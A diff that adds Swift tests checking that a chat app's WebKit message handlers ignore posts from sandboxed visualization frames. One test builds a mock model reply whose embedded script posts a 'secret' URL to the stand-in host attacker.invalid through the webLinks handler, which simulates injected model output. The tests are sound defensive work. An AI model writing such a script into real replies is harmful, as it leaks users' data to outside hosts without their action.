@@ -333,3 +333,109 @@ struct ChatSourceImageRenderingTests {
         #expect(NSImage(pasteboard: pasteboard) != nil)
     }
 }
+
+/// Who the app's script message handlers listen to (`ScriptMessageSender`).
+/// A reply's visualization runs model-written script in a sandboxed frame of
+/// the chat page, and WebKit hands that frame the page's handlers: without the
+/// check it could post `webLinks` and have the app open any address with no
+/// click.
+@Suite("Chat page script messages")
+struct ChatPageScriptMessageTests {
+    @Test("Only the main frame of the app's own page is heard")
+    func senderDecisions() {
+        func accepts(_ main: Bool, _ scheme: String, _ host: String = "", _ page: ScriptMessageSender.Page) -> Bool {
+            ScriptMessageSender.accepts(isMainFrame: main, originProtocol: scheme, originHost: host, from: page)
+        }
+        // A page the app ships as a file.
+        #expect(accepts(true, "file", "", .appFile))
+        #expect(!accepts(false, "file", "", .appFile), "a frame inside the page")
+        #expect(!accepts(false, "", "", .appFile), "a sandboxed frame: an opaque origin")
+        #expect(!accepts(true, "", "", .appFile), "the page replaced by an opaque document")
+        #expect(!accepts(true, "https", "attacker.invalid", .appFile), "the page navigated to the web")
+
+        // A page the app renders under an address of its own.
+        let doc = ScriptMessageSender.Page.appOrigin(scheme: "https", host: "foreverlm.com")
+        #expect(accepts(true, "https", "foreverlm.com", doc))
+        #expect(accepts(true, "HTTPS", "ForeverLM.com", doc))
+        #expect(!accepts(true, "https", "foreverlm.com.attacker.invalid", doc))
+        #expect(!accepts(true, "http", "foreverlm.com", doc))
+        #expect(!accepts(false, "https", "foreverlm.com", doc))
+
+        // A page from the web: the frame is all that can be checked.
+        #expect(accepts(true, "https", "publisher.example", .web))
+        #expect(!accepts(false, "https", "ads.example", .web))
+    }
+
+    /// Records every post with whether the gate would let it through.
+    @MainActor
+    private final class GateRecorder: NSObject, WKScriptMessageHandler {
+        struct Post {
+            let accepted: Bool
+            let isMainFrame: Bool
+            let url: String
+        }
+        var posts: [Post] = []
+
+        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
+            let url = ((message.body as? [String: Any])?["url"] as? String) ?? ""
+            posts.append(Post(accepted: message.isFrom(.appFile), isMainFrame: message.frameInfo.isMainFrame, url: url))
+        }
+    }
+
+    @Test("A visualization's frame cannot ask the app to open an address, and still sizes itself through the page")
+    @MainActor
+    func visualizationFrameIsRefused() async throws {
+        let recorder = GateRecorder()
+        let configuration = WKWebViewConfiguration()
+        configuration.userContentController.add(recorder, name: "webLinks")
+        let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: 640, height: 480), configuration: configuration)
+        ChatMarkdownView.loadTemplate(into: webView)
+        var ready = false
+        for _ in 0..<150 where !ready {
+            ready = try await webView.evaluateJavaScript("typeof window.setMarkdown === 'function'") as? Bool ?? false
+            if !ready { try await Task.sleep(for: .milliseconds(100)) }
+        }
+        #expect(ready, "the chat page never loaded")
+
+        let reply = """
+        Here is the chart.
+
+        ```visualization
+        <div style="height:300px">chart</div>
+        <script>window.webkit.messageHandlers.webLinks.postMessage({url: "https://attacker.invalid/?d=secret", title: "x"});</script>
+        ```
+        """
+        let json = String(data: try JSONEncoder().encode(reply), encoding: .utf8)!
+        _ = try await webView.evaluateJavaScript("window.setMarkdown(\(json)); true")
+        for _ in 0..<60 where recorder.posts.isEmpty {
+            try await Task.sleep(for: .milliseconds(50))
+        }
+        let fromFrame = try #require(recorder.posts.first, "the frame's post never arrived, so the check was never exercised")
+        #expect(fromFrame.url.hasPrefix("https://attacker.invalid"))
+        #expect(!fromFrame.isMainFrame)
+        #expect(!fromFrame.accepted)
+
+        // The height reaches the page by postMessage, which sizes the frame.
+        var height = ""
+        for _ in 0..<60 {
+            height = try await webView.evaluateJavaScript(
+                "document.querySelector('iframe.chat-visualization-frame').style.height"
+            ) as? String ?? ""
+            if height == "300px" { break }
+            try await Task.sleep(for: .milliseconds(50))
+        }
+        #expect(height == "300px")
+
+        // The page's own link is still heard.
+        _ = try await webView.evaluateJavaScript(
+            "window.webkit.messageHandlers.webLinks.postMessage({url: 'https://example.org/', title: 'Example'}); true"
+        )
+        for _ in 0..<60 where recorder.posts.count < 2 {
+            try await Task.sleep(for: .milliseconds(50))
+        }
+        let fromPage = try #require(recorder.posts.last)
+        #expect(fromPage.url == "https://example.org/")
+        #expect(fromPage.isMainFrame)
+        #expect(fromPage.accepted)
+    }
+}
